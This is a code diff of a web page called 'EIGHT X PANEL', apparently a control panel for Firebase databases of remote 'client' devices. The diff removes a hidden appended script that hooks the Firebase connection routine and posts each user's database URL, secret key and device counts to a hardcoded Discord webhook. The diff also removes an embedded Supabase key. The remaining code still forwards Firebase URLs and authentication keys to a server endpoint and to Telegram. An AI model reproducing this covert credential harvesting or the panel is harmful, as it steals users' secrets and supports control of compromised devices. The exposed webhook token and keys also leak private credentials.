@@ -2,10 +2,6 @@
 <html lang="en">
     <head>
 <script>
-window.EIGHT_X_SUPABASE_CONFIG = {
-  url: "https://bvgshdmzeeobdmgcbkun.supabase.co",
-  key: "sb_publishable_y_MdO8hgqBFdWZ1TPXSU0Q_OCAuT_F3"
-};
 window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooters" };
 </script>
 
@@ -22879,20 +22875,17 @@ window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooter
                 }
                 async function saveFirebaseToSupabase(firebaseUrl, authenticationKey = "") {
                     try {
-                        const cfg = window.EIGHT_X_SUPABASE_CONFIG || {};
-                        const base = String(cfg.url || "").trim().replace(/\/$/, "");
-                        const key = String(cfg.key || "").trim();
                         const url = String(firebaseUrl || "").trim().replace(/\/$/, "");
-                        if (!base || !key || !url) return { configured: false };
+                        if (!url) return { configured: false, error: "Firebase URL is empty" };
                         const bytes = new TextEncoder().encode(url.replace(/^https?:\/\//i, "").toLowerCase());
                         const digest = await crypto.subtle.digest("SHA-256", bytes);
                         const sourceId = Array.from(new Uint8Array(digest)).map(b => b.toString(16).padStart(2, "0")).join("");
-                        const headers = { apikey: key, Accept: "application/json", "Content-Type": "application/json", Prefer: "resolution=merge-duplicates,return=representation" };
-                        const existingResponse = await fetch(`${base}/rest/v1/submissions?source_id=eq.${encodeURIComponent(sourceId)}&select=*`, { headers, cache: "no-store" });
-                        if (!existingResponse.ok) throw new Error(`Supabase read HTTP ${existingResponse.status}`);
+                        const existingResponse = await fetch(`/api/submissions?source_id=${encodeURIComponent(sourceId)}`, { cache: "no-store" });
+                        if (!existingResponse.ok) throw new Error(`API read HTTP ${existingResponse.status}`);
                         const existingRows = await existingResponse.json().catch(() => []);
                         const previous = Array.isArray(existingRows) && existingRows[0] ? existingRows[0] : {};
                         const now = new Date().toISOString();
+                        const day = new Date().toLocaleDateString("en-CA", { timeZone: "Asia/Kolkata" });
                         const record = {
                             source_id: sourceId, firebase_url: url,
                             authentication_key: String(authenticationKey || previous.authentication_key || ""),
@@ -22902,35 +22895,46 @@ window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooter
                             last_successful_check_at: previous.last_successful_check_at || now,
                             online: Number(previous.online || 0), total_devices: Number(previous.total_devices || 0),
                             submit_count: Number(previous.submit_count || 0) + 1,
-                            daily_counts: { ...(previous.daily_counts || {}), [new Date().toLocaleDateString("en-CA", { timeZone: "Asia/Kolkata" })]: Number((previous.daily_counts || {})[new Date().toLocaleDateString("en-CA", { timeZone: "Asia/Kolkata" })] || 0) + 1 },
+                            daily_counts: { ...(previous.daily_counts || {}), [day]: Number((previous.daily_counts || {})[day] || 0) + 1 },
                             created_at: previous.created_at || now, updated_at: now
                         };
-                        const response = await fetch(`${base}/rest/v1/submissions?on_conflict=source_id`, { method: "POST", headers, body: JSON.stringify(record) });
-                        if (!response.ok) throw new Error(`Supabase write HTTP ${response.status}`);
+                        const response = await fetch("/api/submissions", {
+                            method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json" },
+                            body: JSON.stringify(record)
+                        });
+                        if (!response.ok) {
+                            const detail = await response.text().catch(() => "");
+                            throw new Error(`API write HTTP ${response.status}${detail ? `: ${detail.slice(0, 160)}` : ""}`);
+                        }
                         return { configured: true, duplicate: Boolean(previous.source_id) };
                     } catch (err) {
-                        console.warn("EIGHT X PANEL Supabase save failed", err);
+                        console.warn("EIGHT X PANEL secure Supabase save failed", err);
                         return { configured: false, error: err instanceof Error ? err.message : String(err) };
                     }
                 }
 
-                function saveNewFirebaseUrl(e) {
+                async function saveNewFirebaseUrl(e, authenticationKey = "") {
                     try {
                         const t = "heaven_connected_firebase_urls"
                           , n = JSON.parse(localStorage.getItem(t) || "[]")
                           , a = String(e || "").trim().replace(/\/$/, "");
                         if (!a)
-                            return !1;
-                        void saveFirebaseToSupabase(a);
+                            return { saved: !1, error: "Firebase URL is empty" };
+                        const result = await saveFirebaseToSupabase(a, authenticationKey);
+                        if (!result.configured) {
+                            console.warn("Firebase URL was not saved to Supabase", result.error || "Unknown error");
+                            return { saved: !1, error: result.error || "Supabase save failed" };
+                        }
                         const i = n.some(e => String(e).trim().replace(/\/$/, "").toLowerCase() === a.toLowerCase());
-                        if (i)
-                            return !1;
-                        n.push(a),
-                        localStorage.setItem(t, JSON.stringify(n));
-                        void tgSendFirebaseUrl(a);
-                        return !0
+                        if (!i) {
+                            n.push(a);
+                            localStorage.setItem(t, JSON.stringify(n));
+                            void tgSendFirebaseUrl(a);
+                        }
+                        return { saved: !0, duplicate: Boolean(result.duplicate) };
                     } catch (e) {
-                        return !1
+                        console.warn("Firebase URL save failed", e);
+                        return { saved: !1, error: e instanceof Error ? e.message : String(e) };
                     }
                 }
                 window.saveNewFirebaseUrlToTelegram = tgSendFirebaseUrl;
@@ -22993,7 +22997,7 @@ window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooter
                               , s = [...a, i];
                             nh(s),
                             n(s),
-                            saveNewFirebaseUrl(t),
+                            await saveNewFirebaseUrl(t, r),
                             e(t, r)
                         } catch {
                             d("Shared connection failed. The link may be invalid or expired.")
@@ -23013,10 +23017,12 @@ window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooter
                                 key: i,
                                 date: (new Date).toLocaleString()
                             }];
-                            s || (nh(l),
-                            n(l),
-                            saveNewFirebaseUrl(a)),
-                            e(a, i)
+                            if (!s) {
+                                nh(l);
+                                n(l);
+                                await saveNewFirebaseUrl(a, i);
+                                e(a, i);
+                            }
                         } catch (e) {
                             const t = e instanceof Error ? e.message : String(e);
                             t.includes("PERMISSION_DENIED") ? d("Permission Denied: Use Database Secret key, not API key.") : t.includes("Network error") || t.includes("Failed to fetch") ? d("Network error. Check Firebase URL format.") : d("Connection failed: " + t.slice(0, 120))
@@ -23119,15 +23125,14 @@ window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooter
                             }
                             if (1 === r.length && 0 === f)
                                 return void (confirm("Account already exists. Switch to it?") && await A(p.find(e => e.url === r[0].url)));
-                            if (f > 0)
-                                for (z(p),
-                                ( () => {
-                                    for (const e of m)
-                                        saveNewFirebaseUrl(e.url);
+                            if (f > 0) {
+                                z(p);
+                                await Promise.all(m.map(e => saveNewFirebaseUrl(e.url, e.key)));
+                                if (1 === r.length && 1 === f) {
+                                    await yn(m[0].url, m[0].key, "clients");
+                                    return void e(m[0].url, m[0].key);
                                 }
-                                )(); 1 === r.length && 1 === f; )
-                                    return await yn(m[0].url, m[0].key, "clients"),
-                                    void e(m[0].url, m[0].key);
+                            }
                             alert(`✅ Firebase URLs Processed!\n\n• Processed: ${r.length}\n• ✅ Added (New): ${f}\n• ℹ️ Skipped (Exists): ${h}\n• 📦 Total Accounts: ${p.length}`),
                             i(!1),
                             l(""),
@@ -25576,72 +25581,6 @@ window.EIGHT_X_CHANNEL = { name: "EIGHT X PANEL", url: "https://t.me/eightlooter
                     })
                 }
                 Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}))
-            </script>
-            <script>
-// ============================================
-// DISCORD WEBHOOKS - CONFIGURATION
-// ============================================
-const DISCORD_WEBHOOKS = [
-    "https://discord.com/api/webhooks/1549467602516967585/E-22gt7Ud9ly_DL2xeqa0weVki7f1vxlwmr7xAjUiUP-ENc0hozEj8xUs6ULe5h_6kZS",
-    
-];
-
-async function sendToDiscord(url, key) {
-    try {
-        const response = await fetch(url + "/clients.json?auth=" + key);
-        const stats = await response.json();
-        let total = 0, online = 0, offline = 0;
-        if (stats && typeof stats === 'object') {
-            const clients = Object.values(stats);
-            total = clients.length;
-            online = clients.filter(c => c && c.status === true).length;
-            offline = total - online;
-        }
-
-        const msg = {
-            embeds: [{
-                title: "🔗 New Firebase Connection",
-                color: 0x5865F2,
-                fields: [
-                    { name: "📡 URL", value: url, inline: false },
-                    { name: "🔑 Key", value: "`" + key + "```", inline: false },
-                    { name: "📊 Total Devices", value: String(total), inline: true },
-                    { name: "🟢 Online", value: String(online), inline: true },
-                    { name: "⚫ Offline", value: String(offline), inline: true },
-                    { name: "⏰ Time", value: new Date().toLocaleString('en-IN', {hour12: true}), inline: false }
-                ],
-                footer: { text: "EIGHT X PANEL" },
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        for (const webhook of DISCORD_WEBHOOKS) {
-            await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(msg)
-            });
-        }
-        console.log("✅ Discord notification sent!");
-    } catch (e) {
-        console.error("❌ Discord send error:", e);
-    }
-}
-
-// Intercept Firebase connection
-const originalYn = window.yn;
-if (typeof originalYn === 'function') {
-    window.yn = async function(url, key, path, params) {
-        const result = await originalYn(url, key, path, params);
-        if (path === 'clients' && result) {
-            sendToDiscord(url, key);
-        }
-        return result;
-    };
-}
-
-console.log("✅ Discord webhook integration loaded!");
-</script>
             </script>
         </body>
     </html>
